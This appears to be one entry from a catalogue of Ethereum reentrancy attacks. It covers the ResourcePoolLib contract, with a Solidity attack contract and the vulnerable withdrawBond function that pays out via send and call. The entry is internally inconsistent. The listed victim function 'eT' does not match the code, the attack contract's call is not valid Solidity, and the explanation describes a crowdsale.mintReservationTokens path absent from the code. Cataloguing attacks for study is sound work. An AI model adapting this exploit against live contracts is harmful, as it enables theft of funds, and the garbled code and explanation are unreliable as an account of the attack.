#########
Attack 16
#########

**Contract Name**

ResourcePoolLib

**Contract Address**

0xf4861b23d0cbf1cf6a3ffb6fe3ac987e87fc1168

**Transaction Count**

16

**Invovled Ethers**

0.94 Ethers

**Length of the Call Chain**

1 external function

**Victim Function**

``eT``

**Attack Mechanisim**

Attack code:
::

    contract Attack is UacCrowdsale{
        ResourcePoolLib r = new ResourcePoolLib();

        constructor() payable {}

        function startAttack() public {   
            r.withdrawBond(pool this, 10, 10);
        }

        function() payable {
            r.withdrawBond(pool this, 10, 10);
        }

        function getvalue() returns (uint) {
            return this.balance;
        }
    }

Attacked code:
::

    contract ResourcePoolLib {
        ...
        function withdrawBond(Pool storage self, address resourceAddress, uint value, uint minimumBond) public {
            if (value > self.bonds[resourceAddress]) {
                throw;
            }

            if (isInPool(self, resourceAddress)) {
                if (self.bonds[resourceAddress] - value < minimumBond) {
                    return;
                }
            }

            deductFromBond(self, resourceAddress, value);

            if (!resourceAddress.send(value)) {
                if (!resourceAddress.call.gas(msg.gas).value(value)()) {
                    throw;
                }
            }
        }
        ...
    }

In this case, the attacker can lauch reentrancy attack by calling ``crowdsale.mintReservationTokens(to, amount)``. The attacker firstly resets the address variable ``crowdsale``. Then he can call victim function ``withdrawBond`` to start attack. The transaction destination is already modified, so the external call is controled by attacker. He can point this call back to the victim function ``withdrawBond`` and form a call-loop easily.

**Attack.** The attacker call ``startAttack`` to start attack.